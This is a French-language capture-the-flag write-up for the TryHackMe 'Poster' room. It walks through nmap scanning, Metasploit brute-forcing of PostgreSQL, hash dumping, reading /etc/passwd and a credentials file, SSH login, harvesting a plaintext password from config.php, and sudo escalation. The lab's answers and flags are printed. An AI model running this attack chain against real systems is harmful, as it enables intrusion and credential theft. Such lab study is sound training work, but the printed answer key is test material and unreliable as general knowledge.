# Poster #

## Task 1 Flag ##

```bash
m@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.200.46 poster.thm' >> /etc/hosts"

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A poster.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 11:11 CEST
Nmap scan report for poster.thm (10.10.200.46)
Host is up (0.033s latency).
rDNS record for 10.10.200.46: porster.thm
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/6%OT=22%CT=1%CU=44573%PV=Y%DS=2%DC=T%G=Y%TM=610CFD07
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(O
OS:1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11N
OS:W6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R
OS:=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   38.85 ms 10.9.0.1
2   39.19 ms porster.thm (10.10.200.46)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.97 seconds

```

Depuis notre scan avec nmap on remarque qu'il a plusieurs services qui tournent.    
Le service SSH sur le port 22.  
Le service HTTP sur le port 80.    
Le service PostgreSQL sur le port 5432.    

**What is the rdbms installed on the server?**

Sur la scan la base de donnée installée est : postgresql  

Réponse : postgresql     

**What port is the rdbms running on?**

On voit qui est sur le port 5432.   

Réponse : 5432    

**After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfconsole -q
 msf6 > search type:auxiliary postgresql 

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  auxiliary/server/capture/postgresql                                         normal  No     Authentication Capture: PostgreSQL
   1  auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2  auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal  No     PostgreSQL Database Name Command Line Flag Injection
   3  auxiliary/scanner/postgres/postgres_login                                   normal  No     PostgreSQL Login Utility
   4  auxiliary/admin/postgres/postgres_readfile                                  normal  No     PostgreSQL Server Generic Query
   5  auxiliary/admin/postgres/postgres_sql                                       normal  No     PostgreSQL Server Generic Query
   6  auxiliary/scanner/postgres/postgres_version                                 normal  No     PostgreSQL Version Probe
   7  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/admin/http/rails_devise_pass_reset

msf6 > use 3
msf6 auxiliary(scanner/postgres/postgres_login) > 

```
On nous demande dans metasploit de chercher module auxiliaire qui permet de voir les identifiants.
Réponse : auxiliary/scanner/postgres/postgres_login
**What are the credentials you found?**

```bash
Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                               Required  Description
   ----              ---------------                                                               --------  -----------
   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                     yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
   PASSWORD                                                                                        no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
   RHOSTS                                                                                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             5432                                                                          yes       The target port
   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                                                             yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                        no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-separated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                          yes       Whether to print output for all attempts

msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS poster.thm
RHOSTS => poster.thm
msf6 auxiliary(scanner/postgres/postgres_login) > set VERBOSE false
VERBOSE => false
msf6 auxiliary(scanner/postgres/postgres_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
```

On configure le scanner :   
On lui met la bonne adresse de la base de donnée.    
On veut pas afficher toutes les tentatives.  
A la première réussite on arrête.   

```bash
msf6 auxiliary(scanner/postgres/postgres_login) > run

[+] 10.10.200.46:5432 - Login Successful: postgres:password@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

On trouve les identifiants suivant : postgres:password   

La réponse est : postgres:password    

**Based on the results of #6, what is the rdbms version installed on the server?**

D'après les informations fournit par nmap, il peut avoir plusieurs versions mais une seule version est la réponse.   
En testant les 4 versions on trouve que la bonne version est la  9.5.21.    
Réponse : 9.5.21    

**What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?**

```bash
msf6 auxiliary(scanner/postgres/postgres_login) > search type:auxiliary postgres dump

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/admin/http/manageengine_pmp_privesc   2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   1  auxiliary/analyze/crack_databases                                normal  No     Password Cracker: Databases
   2  auxiliary/scanner/postgres/postgres_hashdump                     normal  No     Postgres Password Hashdump
   3  auxiliary/scanner/postgres/postgres_schemadump                   normal  No     Postgres Schema Dump


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/postgres/postgres_schemadump
msf6 auxiliary(scanner/postgres/postgres_login) > use 2
msf6 auxiliary(scanner/postgres/postgres_hashdump) > 
```

Réponse : auxiliary/scanner/postgres/postgres_hashdump      

**How many user hashes does the module dump?**
```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf6 auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS poster.thm
RHOSTS => poster.thm
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password

msf6 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

On a 6 hash.   

La réponse : 6 

**What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?**  

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > search type:auxiliary postgres file

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  auxiliary/scanner/postgres/postgres_login                    normal  No     PostgreSQL Login Utility
   1  auxiliary/admin/postgres/postgres_readfile                   normal  No     PostgreSQL Server Generic Query


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/postgres/postgres_readfile
```

La réponse est  : auxiliary/admin/postgres/postgres_readfile    

**What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?**

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > search type:exploit postgres cmd

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

La réponse est : postgres_copy_from_program_cmd_exec    

**Compromise the machine and locate user.txt**

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > use auxiliary/admin/postgres/postgres_readfile
msf6 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS poster.thm
RHOSTS => poster.thm
msf6 auxiliary(admin/postgres/postgres_readfile) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.200.46

Query Text: 'CREATE TEMP TABLE YPqaUFw (INPUT TEXT);
      COPY YPqaUFw FROM '/etc/passwd';
      SELECT * FROM YPqaUFw'
========================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.200.46:5432 Postgres - /etc/passwd saved in /home/tim/.msf4/loot/20210806120632_default_10.10.200.46_postgres.file_437025.txt
[*] Auxiliary module execution completed

```

On lisant le fichier \/etc\/passwd
On voit dans les commentaires un autre chemin avec un fichier \∕home\/dark\∕credentials.txt   

```bash
msf6 auxiliary(admin/postgres/postgres_readfile) > set RFILE /home/dark/credentials.txt
RFILE => /home/dark/credentials.txt

msf6 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.200.46

Query Text: 'CREATE TEMP TABLE BvVLzduboDJD (INPUT TEXT);
      COPY BvVLzduboDJD FROM '/home/dark/credentials.txt';
      SELECT * FROM BvVLzduboDJD'
======================================================================================================================================================

    input
    -----
    dark:qwerty1234#!hackme

dark:qwerty1234#!hackme
[+] 10.10.200.46:5432 Postgres - /home/dark/credentials.txt saved in /home/tim/.msf4/loot/20210806122006_default_10.10.200.46_postgres.file_166071.txt
[*] Auxiliary module execution completed

```

On configure le module lire le fichier credentials.txt
On lance le module.
On trouve les identifiants :
Nom : dark
Mot de passe : qwerty1234#!hackme

** Compromise the machine and locate user.txt **

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh dark@poster.thm
The authenticity of host 'poster.thm (10.10.200.46)' can't be established.
ECDSA key fingerprint is SHA256:9sVne2iRYnXtCm1g5M0jwlzBMg0GmByloIG6c7gDlgA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'poster.thm,10.10.200.46' (ECDSA) to the list of known hosts.
dark@poster.thm's password: 
Last login: Tue Jul 28 20:27:25 2020 from 192.168.85.142
$ grep -r /var/www/ -e "password" 2>/dev/null
/var/www/html/config.php:	$dbname = "mysudopassword";
/var/www/html/poster/assets/css/main.css:input[type="password"],
/var/www/html/poster/assets/css/main.css:  input[type="password"]:invalid,
/var/www/html/poster/assets/css/main.css:  input[type="password"]:focus,
/var/www/html/poster/assets/css/main.css:input[type="password"],
/var/www/html/poster/assets/css/main.css:  #signup-form input[type="password"],
/var/www/html/poster/assets/css/main.css:      #signup-form input[type="password"],
/var/www/html/poster/assets/sass/components/_form.scss:	input[type="password"],
/var/www/html/poster/assets/sass/components/_form.scss:	input[type="password"],
/var/www/html/poster/assets/sass/layout/_signup-form.scss:		input[type="password"],
/var/www/html/poster/assets/sass/layout/_signup-form.scss:			input[type="password"],

```

Il y un fichier config.php qui contient des identifiants.   

```bash
$ cat /var/www/html/config.php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>$ 
```

Il y un utilisateur alison avec un mot de passe.  
Nom : alison   
Mot de passe : p4ssw0rdS3cur3!#    

```bash
$ su alison
Password: 
alison@ubuntu:/$ cat /home/alison/user.txt 
THM{postgresql_fa1l_conf1gurat1on}
```

Dans le répertoire \/home\/alison\/ on trouve un fichier user.txt avec le flag.    

Réponse : THM{postgresql_fa1l_conf1gurat1on}   

**Escalate privileges and obtain root.txt**

```bash
alison@ubuntu:/$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

La configuration de sudo nous permet d'exécuter tous les fichiers avec les droits root sans mot de passe.   

```bash
alison@ubuntu:/$ sudo cat /root/root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```

On lit le flag.   
La réponse est : THM{c0ngrats_for_read_the_f1le_w1th_credent1als}         

